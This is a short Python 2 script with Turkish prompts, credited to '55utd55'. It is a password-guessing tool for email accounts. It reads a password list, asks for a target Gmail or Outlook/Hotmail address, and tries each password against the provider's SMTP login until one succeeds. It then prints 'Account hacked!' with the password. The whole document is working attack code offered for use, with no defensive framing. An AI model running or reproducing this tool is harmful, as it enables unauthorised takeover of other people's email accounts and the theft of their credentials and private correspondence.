#!/usr/bin/python
import smtplib
from os import system

def main():
   print '================================================='
   print '||            create by 55utd55                ||'
   print '================================================='

main()
print '[1] Saldir'
print '[2] Cikis Yap'
option = input('==>')
if option == 1:
   file_path = raw_input('sifre listenizin adini giriniz :')
else:
   system('clear')
   exit()
gmail_pass_file = open(file_path,'r')
gmail_pass_list = gmail_pass_file.readlines()
def login():
	print 'HEDEF MAIL SISTEMINI SECINIZ!'
	print '[1] Gmail'
	print '[2] Windows Live -hotmail,outlook-'
	print '[3] Cikis Yap'
	mailtype = input('==>')
	if mailtype == 1:
	    i = 0
	    user_name_mail = raw_input('Hedef gmail adresini giriniz :')
	    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
	    server.ehlo()
	    for password in gmail_pass_list:
	      i = i + 1
	      print str(i) + '/' + str(len(gmail_pass_list))
	      try:
	         server.login(user_name_mail, password)
	         system('clear')
	         main()
	         print '\n'
	         print '[+] Hesap Hacklendi! Sifresi = ' + password
	         break
	      except smtplib.SMTPAuthenticationError as e:
	         error = str(e)
	         if error[14] == '<':
	            system('clear')
	            main()
	            print '[+] Hesap Hacklendi! Sifresi = ' + password
	
	            break
	         else:
	            print '[!] Sifre bulunamadi, yeni bir sifre listesi deneyiniz! Denenen sifre= ' + password
	elif mailtype == 2:
	    i = 0
	    user_name_mail = raw_input('Hedef windows live mail adresini giriniz :')
	    server = smtplib.SMTP('smtp-mail.outlook.com', 587)
	    server.ehlo()
	    server.starttls()
	    server.ehlo()
	    for password in gmail_pass_list:
	      i = i + 1
	      print str(i) + '/' + str(len(gmail_pass_list))
	      try:
	         server.login(user_name_mail, password)
	         system('clear')
	         main()
	         print '\n'
	         print '[+] Hesap Hacklendi! Sifresi = ' + password
	         break
	      except smtplib.SMTPAuthenticationError as e:
	         error = str(e)
	         if error[14] == '<':
	            system('clear')
	            main()
	            print '[+] Hesap Hacklendi! Sifresi = ' + password
	
	            break
	         else:
	            print '[!] Sifre bulunamadi, yeni bir sifre listesi deneyiniz! Denenen sifre= ' + password
	elif mailtype == 3:
   		system('clear')
		exit()
login()
